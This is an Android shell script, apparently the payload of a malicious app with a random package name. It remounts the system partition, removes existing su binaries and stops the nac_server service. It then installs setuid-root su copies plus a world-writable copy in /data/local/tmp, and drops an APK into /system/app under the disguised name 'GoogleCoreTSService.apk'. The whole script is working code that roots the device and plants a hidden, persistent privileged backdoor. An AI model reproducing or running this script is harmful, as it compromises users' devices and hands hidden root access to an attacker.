TEMPPATH=/data/data/bmtet.wwjx.eat/files
BUSYBOX=/data/data/bmtet.wwjx.eat/files/busybox
export PATH=$TEMPPATH:$PATH

chmod 777 $TEMPPATH/busybox 
uid=$(busybox id -u)
if [ $uid -ne 0 ]; then
  echo "Are you root ? OK ,try anyway."
fi
mount -o remount,rw /system
$BUSYBOX mount -o remount,rw /system
if [ -e "/system/xbin/su" -o -L "/system/xbin/su" ]; then
  echo "Delete xbin su ..."
  $BUSYBOX rm -rf /system/xbin/su
fi

if [ -e "/system/bin/su" -o -L "/system/bin/su" ]; then
  echo "Delete bin su ..."
  $BUSYBOX rm -rf /system/bin/su
fi
/system/bin/stop nac_server
$BUSYBOX cat $TEMPPATH/su > /system/xbin/su
$BUSYBOX chown 0.0 /system/xbin/su
$BUSYBOX chmod 6755 /system/xbin/su
$BUSYBOX cat /system/xbin/su > /system/bin/su
$BUSYBOX chown 0.0 /system/bin/su
$BUSYBOX chmod 6755 /system/bin/su
$BUSYBOX cat $TEMPPATH/busybox > /system/xbin/busybox
$BUSYBOX chown 0.0 /system/xbin/busybox
$BUSYBOX chmod 755 /system/xbin/busybox
$BUSYBOX cat $TEMPPATH/romt > /system/app/GoogleCoreTSService.apk
$BUSYBOX chown 0.0 /system/app/GoogleCoreTSService.apk
$BUSYBOX chmod 644 /system/app/GoogleCoreTSService.apk
$BUSYBOX cat $TEMPPATH/su > /data/local/tmp/systemfile
$BUSYBOX chown shell.shell /data/local/tmp/systemfile
$BUSYBOX chmod 777 /data/local/tmp/systemfile

echo "Now, your device is rooooted !"
sync

